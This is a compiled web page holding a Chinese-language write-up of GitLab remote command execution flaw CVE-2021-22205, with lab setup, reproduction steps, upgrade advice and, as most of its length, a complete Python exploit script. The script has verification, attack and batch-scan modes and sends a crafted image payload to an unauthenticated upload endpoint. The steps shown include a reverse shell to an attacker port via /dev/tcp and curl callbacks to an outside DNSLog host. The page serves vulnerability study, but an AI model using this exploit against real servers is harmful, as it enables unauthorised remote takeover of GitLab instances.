import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as n,d as t,e as a}from"./app-58e4a7d6.js";const u={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c={href:"https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html",target:"_blank",rel:"noopener noreferrer"},v=e("p",null,"参考链接：",-1),m={href:"https://hackerone.com/reports/1154542",target:"_blank",rel:"noopener noreferrer"},_={href:"https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html",target:"_blank",rel:"noopener noreferrer"},x={href:"https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml",target:"_blank",rel:"noopener noreferrer"},b=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个GitLab 13.10.1版本服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看到GitLab的登录页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),h={href:"https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/poc.py",target:"_blank",rel:"noopener noreferrer"},g=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py http://your-ip:8080 &quot;touch /tmp/success&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232150565.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器内，可见<code>touch /tmp/success</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232149869.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4),f={href:"https://github.com/Al1ex/CVE-2021-22205",target:"_blank",rel:"noopener noreferrer"},q=a(`<p>漏洞检测：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 CVE-2021-22205.py -v true -t http://your-target-ip:port/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>DNSLog 回显：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;curl http://your-ip/1.txt&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>反弹 Shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 写shell
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;echo &#39;bash -i &gt;&amp; /dev/tcp/your-ip/9999 0&gt;&amp;1&#39; &gt; /tmp/1.sh&quot;

# 赋予执行权限
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;chmod +x /tmp/1.sh&quot;

# 监听反弹shell端口
nc -vvl 9999

# 运行shell
python3 CVE-2021-22205.py -a true -t http://your-target-ip:port/ -c &quot;/bin/bash /tmp/1.sh&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><ol><li><p>设置 Gitlab 仅对可信地址开放；</p></li><li><p>升级至安全版本：</p><p>GitLab（CE/EE） &gt;= 13.8.8 GitLab（CE/EE） &gt;= 13.9.6 GitLab（CE/EE） &gt;= 13.10.3</p></li></ol><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,9),y={href:"https://github.com/Al1ex/CVE-2021-22205",target:"_blank",rel:"noopener noreferrer"},k=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests
from bs4 import BeautifulSoup
import base64
import random
import sys
import os
import argparse

requests.packages.urllib3.disable_warnings()

def title():
    print(&quot;&quot;&quot;
	  ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
	 / ___\\ \\   / / ____|   |___ \\ / _ \\___ \\/ |    |___ \\|___ \\|___ \\ / _ \\| ___| 
	| |    \\ \\ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \\ 
	| |___  \\ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
 	\\____ |  \\_/  |_____|   |_____|\\___/_____|_|    |_____|_____|_____|\\___/|____/ 

 	                                Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex                             
    	&quot;&quot;&quot;)
    print(&#39;&#39;&#39;
        验证模式：python CVE-2021-22205.py -v true -t target_url 
        攻击模式：python CVE-2021-22205.py -a true -t target_url -c command 
        批量检测：python CVE-2021-22205.py -s true -f file 
        &#39;&#39;&#39;)    

def check(target_url):
    session = requests.Session()
    try:
        req1 = session.get(target_url.strip(&quot;/&quot;) + &quot;/users/sign_in&quot;, verify=False)
        soup = BeautifulSoup(req1.text, features=&quot;lxml&quot;)
        token = soup.findAll(&#39;meta&#39;)[16].get(&quot;content&quot;)
        data = &quot;\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;test.jpg\\&quot;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\nAT&amp;TFORM\\x00\\x00\\x03\\xafDJVMDIRM\\x00\\x00\\x00.\\x81\\x00\\x02\\x00\\x00\\x00F\\x00\\x00\\x00\\xac\\xff\\xff\\xde\\xbf\\x99 !\\xc8\\x91N\\xeb\\x0c\\x07\\x1f\\xd2\\xda\\x88\\xe8k\\xe6D\\x0f,q\\x02\\xeeI\\xd3n\\x95\\xbd\\xa2\\xc3\\&quot;?FORM\\x00\\x00\\x00^DJVUINFO\\x00\\x00\\x00\\n\\x00\\x08\\x00\\x08\\x18\\x00d\\x00\\x16\\x00INCL\\x00\\x00\\x00\\x0fshared_anno.iff\\x00BG44\\x00\\x00\\x00\\x11\\x00J\\x01\\x02\\x00\\x08\\x00\\x08\\x8a\\xe6\\xe1\\xb17\\xd9*\\x89\\x00BG44\\x00\\x00\\x00\\x04\\x01\\x0f\\xf9\\x9fBG44\\x00\\x00\\x00\\x02\\x02\\nFORM\\x00\\x00\\x03\\x07DJVIANTa\\x00\\x00\\x01P(metadata\\n\\t(Copyright \\&quot;\\\\\\n\\&quot; . qx{curl \`whoami\`.82sm53.dnslog.cn} . \\\\\\n\\&quot; b \\&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \\n\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\\r\\n\\r\\n&quot;
        headers = {
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;,
            &quot;Connection&quot;: &quot;close&quot;,
            &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;,
            &quot;X-CSRF-Token&quot;: f&quot;{token}&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
        flag = &#39;Failed to process image&#39;
        req2 = session.post(target_url.strip(&quot;/&quot;) + &quot;/uploads/user&quot;, data=data, headers=headers, verify=False)
        if flag in req2.text:
            print(&quot;[+] 目标 {} 存在漏洞&quot;.format(target_url))
        else:
            print(&quot;[-] 目标 {} 不存在漏洞&quot;.format(target_url))
    except Exception as e:
        print(e)

def attack(target_url,command):
    session = requests.Session()
    try:
        req1 = session.get(target_url.strip(&quot;/&quot;) + &quot;/users/sign_in&quot;, verify=False)
        soup = BeautifulSoup(req1.text, features=&quot;lxml&quot;)
        token = soup.findAll(&#39;meta&#39;)[16].get(&quot;content&quot;)
        data = &quot;\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;test.jpg\\&quot;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\nAT&amp;TFORM\\x00\\x00\\x03\\xafDJVMDIRM\\x00\\x00\\x00.\\x81\\x00\\x02\\x00\\x00\\x00F\\x00\\x00\\x00\\xac\\xff\\xff\\xde\\xbf\\x99 !\\xc8\\x91N\\xeb\\x0c\\x07\\x1f\\xd2\\xda\\x88\\xe8k\\xe6D\\x0f,q\\x02\\xeeI\\xd3n\\x95\\xbd\\xa2\\xc3\\&quot;?FORM\\x00\\x00\\x00^DJVUINFO\\x00\\x00\\x00\\n\\x00\\x08\\x00\\x08\\x18\\x00d\\x00\\x16\\x00INCL\\x00\\x00\\x00\\x0fshared_anno.iff\\x00BG44\\x00\\x00\\x00\\x11\\x00J\\x01\\x02\\x00\\x08\\x00\\x08\\x8a\\xe6\\xe1\\xb17\\xd9*\\x89\\x00BG44\\x00\\x00\\x00\\x04\\x01\\x0f\\xf9\\x9fBG44\\x00\\x00\\x00\\x02\\x02\\nFORM\\x00\\x00\\x03\\x07DJVIANTa\\x00\\x00\\x01P(metadata\\n\\t(Copyright \\&quot;\\\\\\n\\&quot; . qx{&quot;+  command +&quot;} . \\\\\\n\\&quot; b \\&quot;) )                                                                                                                                                                                                                                                                                                                                                                                                                                     \\n\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\\r\\n\\r\\n&quot;
        headers = {
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;,
            &quot;Connection&quot;: &quot;close&quot;,
            &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5&quot;,
            &quot;X-CSRF-Token&quot;: f&quot;{token}&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
        flag = &#39;Failed to process image&#39;
        req2 = session.post(target_url.strip(&quot;/&quot;) + &quot;/uploads/user&quot;, data=data, headers=headers, verify=False)
        if flag in req2.text:
            print(&quot;[+] 目标 {} 存在漏洞&quot;.format(target_url))
            print(&quot;[+] 请到dnslog或主机检查执行结果&quot;)
        else:
            print(&quot;[-] 目标 {} 不存在漏洞&quot;.format(target_url))
    except Exception as e:
        print(e)

def scan(file):
    for url_link in open(file, &#39;r&#39;, encoding=&#39;utf-8&#39;):
            if url_link.strip() != &#39;&#39;:
                url_path = format_url(url_link.strip())
                check(url_path)

def format_url(url):
    try:
        if url[:4] != &quot;http&quot;:
            url = &quot;https://&quot; + url
            url = url.strip()
        return url
    except Exception as e:
        print(&#39;URL 错误 {0}&#39;.format(url))    

def main():
    parser = argparse.ArgumentParser(description=&#39;GitLab &lt; 13.10.3 RCE&#39;)
    parser.add_argument(&#39;-v&#39;, &#39;--verify&#39;, type=bool,help=&#39; 验证模式 &#39;)
    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, type=str, help=&#39; 目标URL &#39;)

    parser.add_argument(&#39;-a&#39;, &#39;--attack&#39;, type=bool, help=&#39; 攻击模式 &#39;)
    parser.add_argument(&#39;-c&#39;, &#39;--command&#39;, type=str, help=&#39; 执行命令 &#39;)

    parser.add_argument(&#39;-s&#39;, &#39;--scan&#39;, type=bool, help=&#39; 批量模式 &#39;)
    parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, type=str, help=&#39; 文件路径 &#39;)


    args = parser.parse_args()

    verify_model = args.verify
    target_url   = args.target

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    if verify_model is True and target_url !=None:
        check(target_url)
    elif attack_model is True and target_url != None and command != None:
        attack(target_url,command)
    elif scan_model is True and file != None:
        scan(file)
    else:
        sys.exit(0)   

if __name__ == &#39;__main__&#39;:
    title()
    main()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function C(E,F){const i=s("ExternalLinkIcon");return l(),d("div",null,[o,e("p",null,[n("GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞"),e("a",c,[n("CVE-2021-22204"),t(i)]),n("的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。")]),v,e("ul",null,[e("li",null,[e("a",m,[n("https://hackerone.com/reports/1154542"),t(i)])]),e("li",null,[e("a",_,[n("https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html"),t(i)])]),e("li",null,[e("a",x,[n("https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/"),t(i)])]),e("li",null,[e("a",p,[n("https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml"),t(i)])])]),b,e("p",null,[n("GitLab的/uploads/user接口可以上传图片且无需认证，利用"),e("a",h,[n("poc.py"),t(i)]),n("脚本来测试这个漏洞：")]),g,e("p",null,[n("另一个 exp："),e("a",f,[n("https://github.com/Al1ex/CVE-2021-22205"),t(i)])]),q,e("p",null,[n("exp："),e("a",y,[n("https://github.com/Al1ex/CVE-2021-22205"),t(i)])]),k])}const G=r(u,[["render",C],["__file","GitLab 远程命令执行漏洞 CVE-2021-22205.html.vue"]]);export{G as default};
